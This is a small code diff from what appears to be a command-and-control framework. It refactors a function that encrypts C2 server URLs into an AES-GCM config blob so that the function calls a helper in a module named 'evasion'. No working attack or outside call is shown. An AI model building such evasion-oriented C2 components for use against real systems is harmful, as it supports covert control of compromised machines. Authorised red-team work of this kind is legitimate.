@@ -168,7 +168,7 @@ def encrypt_config(
     """Encrypt config into an AES-GCM blob and return (b64_blob, hex_key)."""
     import json
 
-    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+    from core.c2.evasion import aes_encrypt_payload
 
     config = {
         "urls": c2_urls,
@@ -178,12 +178,8 @@ def encrypt_config(
     }
 
     plaintext = json.dumps(config).encode("utf-8")
-    key = AESGCM.generate_key(bit_length=256)
-    aesgcm = AESGCM(key)
-    nonce = os.urandom(12)
-
-    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
-    blob = base64.b64encode(nonce + ciphertext).decode("utf-8")
+    encrypted, key = aes_encrypt_payload(plaintext)
+    blob = base64.b64encode(encrypted).decode("utf-8")
 
     return blob, key.hex()
 
